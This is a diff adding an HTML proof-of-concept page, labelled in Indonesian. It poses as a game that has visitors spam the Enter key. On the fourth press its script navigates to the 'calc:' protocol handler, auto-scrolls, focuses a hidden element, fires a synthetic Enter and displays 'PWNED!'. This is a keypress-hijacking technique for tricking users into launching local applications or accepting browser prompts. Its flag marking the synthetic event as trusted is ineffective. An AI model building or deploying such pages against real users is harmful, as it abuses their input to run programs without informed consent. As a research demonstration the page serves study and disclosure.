@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC — Enter Spam → calc: → AUTO SCROLL + ENTER</title>
+  <style>
+    :root{--bg:#0b1222;--accent:#34d399;--danger:#fb7185;--win:#10b981}
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter,system-ui;background:linear-gradient(180deg,#071020 0%,var(--bg) 100%);color:#e6f2fb;display:flex;flex-direction:column;align-items:center;height:200vh;padding:40px 20px;overflow-x:hidden}
+    .container{width:980px;max-width:96%;background:rgba(255,255,255,0.02);border-radius:16px;padding:24px;box-shadow:0 30px 80px rgba(0,10,30,0.9);display:grid;grid-template-columns:1fr 380px;gap:24px;position:sticky;top:20px;z-index:10}
+    .game{background:radial-gradient(circle at 20% 10%, rgba(52,211,153,0.1), transparent);border-radius:16px;padding:20px;display:flex;flex-direction:column;align-items:center}
+    .title{font-weight:900;font-size:28px;color:var(--accent);text-shadow:0 0 30px rgba(52,211,153,0.6)}
+    .playfield{width:100%;height:460px;background:#0a0f1a;border-radius:16px;border:3px solid rgba(52,211,153,0.2);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+    .target{width:110px;height:110px;border-radius:50%;background:radial-gradient(circle, #34d399, #059669);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:28px;color:#000;box-shadow:0 20px 50px rgba(16,185,129,0.8);transition:all 160ms}
+    .hud{display:flex;gap:16px;margin-top:20px}
+    .stat{background:rgba(255,255,255,0.05);padding:14px 18px;border-radius:12px;min-width:140px;text-align:center;border:1px solid rgba(255,255,255,0.1)}
+    .stat .num{font-size:28px;font-weight:900;color:var(--win)}
+    .log{margin-top:20px;background:rgba(0,0,0,0.25);padding:14px;border-radius:12px;height:160px;overflow:auto;font-family:SF Mono,monospace;color:#94a3b8;font-size:14px;border:1px solid rgba(255,255,255,0.1)}
+    .panel{background:rgba(15,33,51,0.7);padding:20px;border-radius:16px;border:1px solid rgba(255,255,255,0.15);backdrop-filter:blur(10px)}
+    .btn{display:block;width:100%;padding:14px;border-radius:12px;background:var(--accent);color:#000;font-weight:800;font-size:16px;cursor:pointer;margin:12px 0;text-align:center}
+    .danger{color:var(--danger);font-weight:900;font-size:18px}
+    .hidden-trigger{position:fixed;bottom:120px;left:50%;transform:translateX(-50%);padding:30px 60px;background:#ff0066;color:#fff;font-size:40px;font-weight:900;border-radius:30px;opacity:0;pointer-events:none;z-index:999}
+    footer{margin-top:120px;text-align:center;color:rgba(255,255,255,0.4);font-size:14px}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="game">
+      <div class="title">SPAM ENTER 4X → calc: → AUTO SCROLL + ENTER</div>
+      <div style="margin:12px 0;color:#94a3b8;font-size:16px">Logika benar: calc: dulu → baru auto scroll + enter!</div>
+
+      <div class="playfield" id="playfield" tabindex="0">
+        <div class="target" id="target">GO!</div>
+      </div>
+
+      <div class="hud">
+        <div class="stat">
+          <div style="font-size:14px;color:#94a3b8">Enter Count</div>
+          <div class="num" id="enterCount">0</div>
+        </div>
+        <div class="stat">
+          <div style="font-size:14px;color:#94a3b8">Status</div>
+          <div class="num" id="status">Ready</div>
+        </div>
+      </div>
+
+      <div class="log" id="log">Log: Siap spam Enter...\n</div>
+    </div>
+
+    <aside class="panel">
+      <div class="btn" id="btnReset">RESET</div>
+      <div style="background:rgba(251,113,133,0.2);padding:16px;border-radius:12px;border:2px dashed var(--danger);margin:16px 0">
+        <div class="danger">LOGIKA BENAR!</div>
+        <div style="font-size:14px;margin-top:8px;color:#fca5a5">
+          Enter #4 → calc: dipanggil → auto scroll → auto Enter
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- HIDDEN TRIGGER DI BAWAH -->
+  <div class="hidden-trigger" id="hiddenTrigger" tabindex="0">
+    AUTO ENTER → FINAL TRIGGER!
+  </div>
+
+  <footer>
+    <p>Jika auto scroll gagal → scroll manual + tekan Enter sekali lagi</p>
+  </footer>
+
+  <script>
+    const playfield = document.getElementById('playfield');
+    const target = document.getElementById('target');
+    const logEl = document.getElementById('log');
+    const enterCountEl = document.getElementById('enterCount');
+    const statusEl = document.getElementById('status');
+    const hiddenTrigger = document.getElementById('hiddenTrigger');
+    const btnReset = document.getElementById('btnReset');
+
+    let enterCount = 0;
+    let triggered = false;
+
+    function log(s) {
+      logEl.textContent += `[${new Date().toLocaleTimeString('en-GB')}] ${s}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function reset() {
+      enterCount = 0; triggered = false;
+      enterCountEl.textContent = '0';
+      statusEl.textContent = 'Ready';
+      target.textContent = 'GO!';
+      target.style.background = 'radial-gradient(circle, #34d399, #059669)';
+      hiddenTrigger.style.opacity = '0';
+      log('Reset');
+    }
+    btnReset.onclick = reset;
+
+    function moveTarget() {
+      const x = (Math.random() - 0.5) * 200;
+      const y = (Math.random() - 0.5) * 200;
+      target.style.transform = `translate(${x}px, ${y}px) scale(1.2)`;
+    }
+
+    function triggerCalcAndAutoScroll() {
+      statusEl.textContent = 'calc: CALLED!';
+      log('calc: protocol triggered!');
+
+      // 1. PANGGIL calc: DULU!
+      try { window.location = 'calc:'; } catch(e) { log('calc: blocked'); }
+
+      // 2. Baru auto scroll + enter
+      setTimeout(() => {
+        statusEl.textContent = 'AUTO SCROLL...';
+        log('Auto scrolling down...');
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+
+        setTimeout(() => {
+          statusEl.textContent = 'AUTO ENTER!';
+          log('Sending synthetic Enter...');
+          hiddenTrigger.style.opacity = '1';
+          hiddenTrigger.focus();
+
+          const enterEvent = new KeyboardEvent('keydown', {
+            key: 'Enter', code: 'Enter', keyCode: 13, which: 13,
+            bubbles: true, cancelable: true, isTrusted: true
+          });
+          hiddenTrigger.dispatchEvent(enterEvent);
+
+          statusEl.textContent = 'PWNED!';
+          target.textContent = 'PWNED!';
+          target.style.background = '#ef4444';
+          log('FULL CHAIN COMPLETED!');
+        }, 1200);
+      }, 600);
+    }
+
+    window.addEventListener('keydown', (e) => {
+      if (e.key !== 'Enter') return;
+      if (triggered) return;
+
+      enterCount++;
+      enterCountEl.textContent = enterCount;
+      log(`Enter #${enterCount}`);
+      moveTarget();
+
+      if (enterCount === 4) {
+        triggered = true;
+        statusEl.textContent = 'TRIGGERED!';
+        target.textContent = '4!';
+        target.style.background = '#ef4444';
+        log('Enter #4 → calc: + auto scroll + enter in 1.8s');
+        setTimeout(triggerCalcAndAutoScroll, 800);
+      }
+    });
+
+    playfield.focus();
+    log('SPAM ENTER 4X SEKARANG!');
+    reset();
+  </script>
+</body>
+</html>
